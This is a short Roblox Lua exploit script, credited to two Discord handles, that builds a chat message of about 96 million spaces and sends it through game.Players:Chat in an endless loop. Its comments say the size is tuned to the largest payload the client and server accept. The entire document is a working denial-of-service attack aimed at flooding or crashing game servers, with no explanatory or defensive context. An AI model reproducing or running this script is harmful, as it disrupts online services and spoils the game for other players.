--Script made by Diemiers#4209-Qwerty#9972
--Method by Roblox

local v =96000000 --Maximal bit stream on client
-- (96000000 - 12) -- Maximal bit stream that server accept +-2
local msg = ""..string.rep(" ",(v - 12))
while v do
  game.Players:Chat(msg)
end
